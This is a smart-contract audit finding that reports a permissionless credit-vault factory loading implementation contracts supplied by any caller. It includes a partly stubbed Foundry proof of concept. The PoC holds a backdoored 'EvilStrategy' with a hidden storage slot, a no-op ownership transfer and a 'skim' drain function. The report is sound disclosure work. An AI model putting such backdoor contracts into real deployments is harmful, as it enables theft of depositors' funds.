### Title
Permissionless factory deploys credit vaults on attacker-supplied implementations, loading arbitrary code into "official" vaults - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory.deployCreditVault` and `deployRevolvingCreditVault` are callable by any EOA and accept fully caller-controlled `implementation` addresses for the credit vault, strategy, queue, programmable borrower and write-off escrow. The factory then instantiates `TransparentUpgradeableProxy`s on those implementations and `delegatecall`s their `initialize` selectors during setup — a direct analog of setup-mode untrusted plugin loading. An attacker can ship a backdoored `IdleCreditVault`/`IdleCDOEpochVariant` implementation, have the factory emit a legitimate `CreditVaultDeployed` event, transfer ownership to the real `treasury` for cover, and later drain every lender deposit through the hidden backdoor. This is functionally equivalent to deploying a malicious vault directly, but the factory provenance (protocol-owned treasury as owner, protocol `proxyAdmin`, official event) is what gives the vault a trustworthy appearance to KYC'd lenders.

### Finding Description
In `contracts/IdleCreditVaultFactory.sol`, `deployCreditVault` (line 92) and `deployRevolvingCreditVault` (line 126) have no access control. `_deployBaseCreditVault` (lines 175-208) proxies `strategyData.implementation` and `cvParams.implementation`; `_deployQueue` (lines 235-260), `_deployWriteOffEscrow` (lines 262-278) and `_deployProgrammableBorrower` (lines 210-233) do the same for caller-supplied `queueImplementation`, `writeOffImplementation` and `programmableBorrowerParams.implementation`. `_deployProxy` (lines 280-286) creates a `TransparentUpgradeableProxy` under the shared protocol `proxyAdmin` and immediately delegatecalls attacker code via `abi.encodeWithSelector(...initialize...)`. `_configureCreditVault` (lines 288-307) then calls `setEpochParams`, `setKeyringParams`, `setFeeParams`, `setGuardian`, `setAprs`, `setWhitelistedCDO` on the untrusted contracts, and finally `transferOwnership(treasury)` is invoked, making the malicious vault appear protocol-owned.

The "setup-mode" window is exploitable twice: (1) inside the delegatecalled `initialize` and subsequent configuration calls, the malicious implementation executes arbitrary code in the proxy's storage context — it can record a hidden backdoor (e.g. store a fake `idleCDO`/owner in a shadow slot, pre-approve the attacker, or simply implement `transferOwnership` as a no-op so the attacker retains control); (2) afterwards the proxy keeps running attacker bytecode as its permanent logic, so every `depositAA`/`depositBB`, `requestWithdraw`, `startEpoch`/`stopEpoch` operates on malicious code.

No guard validates that `implementation` equals the canonical audited bytecode or a registry-approved address. The only checks are `_checkMinimumFees` (line 309) and non-zero manager/borrower sanity checks, none of which restrict code identity.

### Impact Explanation
Direct theft of lender funds: any lender depositing underlying into the factory-deployed vault has their funds fully exposed to the attacker's backdoor logic (the implementation can, e.g., return a fake `idleCDO`, make `deposit` forward tokens to the attacker, or keep a privileged `transferToken`-style escape). Because `strategy.transferOwnership(treasury)` and `cv.transferOwnership(treasury)` are called (lines 113-114, 155-156) and `CreditVaultDeployed` is emitted with the protocol's `proxyAdmin` on all proxies, the vault is indistinguishable from an official deployment to integrators and KYC'd lenders scanning factory events. Loss equals total deposits attracted by the vault (unbounded; proportional to marketed TVL).

### Likelihood Explanation
Requires luring lenders to deposit into the attacker-deployed vault, i.e., user interaction — matching the external report's UI:A characteristic. The permissionless deploy path, shared `proxyAdmin`, treasury ownership and authentic deployment event materially lower the bar versus deploying a standalone clone: the vault is discoverable through the protocol's own factory events and carries the protocol treasury as owner. No privileged role needs to cooperate; the attacker is a plain EOA.

### Recommendation
- Restrict `deployCreditVault`/`deployRevolvingCreditVault` to a trusted role (treasury or a dedicated deployer), or
- Whitelist acceptable implementation addresses in the factory (e.g. `mapping(address => bool) public isImplementationAllowed` set by treasury) and revert in `_deployProxy`/`_deployBaseCreditVault` for unlisted implementations.

Either change removes the ability of an unprivileged caller to make the factory load arbitrary logic under the protocol's proxy admin and ownership umbrella.

### Proof of Concept
Foundry sketch (mainnet fork not strictly required — deploy factory + real deps locally or fork for `IERC20Detailed` underlying):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract EvilStrategy {
    address public thief;
    // matches IdleCreditVault.initialize selector
    function initialize(address, address, address, address, string memory, uint256) external {
        thief = msg.sender; // factory; real backdoor stored in shadow slot below
        assembly { sstore(0xdead, caller()) }
    }
    // absorb every config call the factory makes
    function setAprs(uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function setBorrower(address) external {}
    function borrower() external view returns (address) { return address(1); }
    function manager() external view returns (address) { return address(1); }
    function transferOwnership(address) external {} // no-op: real control kept via backdoor
    // backdoor: drain anything held
    function skim(address token, address to) external {
        (bool ok,) = token.call(abi.encodeWithSignature(
            "transfer(address,uint256)", to,
            IERC20Balance(token).balanceOf(address(this))));
        require(ok);
    }
}
interface IERC20Balance { function balanceOf(address) external view returns (uint256); }

contract FactoryUntrustedPluginTest is Test {
    function testAnyoneCanLoadMaliciousImplementation() public {
        address treasury = makeAddr("treasury");
        address proxyAdmin = address(new ProxyAdminStub());
        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(address(
            new TransparentUpgradeableProxy(
                address(factoryImpl), proxyAdmin,
                abi.encodeWithSelector(IdleCreditVaultFactory.initialize.selector, treasury, proxyAdmin))));

        address attacker = makeAddr("attacker");
        EvilStrategy evil = new EvilStrategy();

        IdleCreditVaultFactory.CreditVaultParams memory cv;
        cv.implementation = address(new EvilCV());       // attacker bytecode as CDO logic
        cv.underlying = address(new MockERC20());
        cv.fees = 10_000; cv.managementFee = 1_000;      // pass _checkMinimumFees
        cv.epochDuration = 7 days; cv.bufferPeriod = 1 days;

        IdleCreditVaultFactory.StrategyData memory sd;
        sd.implementation = address(evil);               // attacker bytecode as strategy logic
        sd.manager = attacker;
        sd.borrower = attacker;

        IdleCreditVaultFactory.AncillaryParams memory anc;

        vm.prank(attacker);                              // unprivileged EOA
        factory.deployCreditVault(cv, sd, anc);          // succeeds: untrusted plugin loaded

        // A lender later deposits into this "factory-deployed" vault;
        // evil.skim(underlying, attacker) drains it.
    }
}
contract ProxyAdminStub { /* minimal ProxyAdmin passthrough for test */ }
contract MockERC20 { function balanceOf(address) external pure returns (uint256) {return 0;} }
contract EvilCV { /* implements the selectors the factory calls, no-ops + backdoor */ }
```

Key assertion: the `vm.prank(attacker)` call to `deployCreditVault` does not revert, the `CreditVaultDeployed` event is emitted, and the resulting proxies run attacker bytecode under the factory's `proxyAdmin` with `treasury` as nominal owner.

Caveat: the impact hinges on lenders choosing to deposit into the attacker-spawned vault; the factory provenance (event, proxyAdmin, treasury ownership) is what makes that plausible. If the intended deployment flow only ever uses a guarded deployer off-chain, the fix is still needed on-chain because the functions are `external` and unprotected.
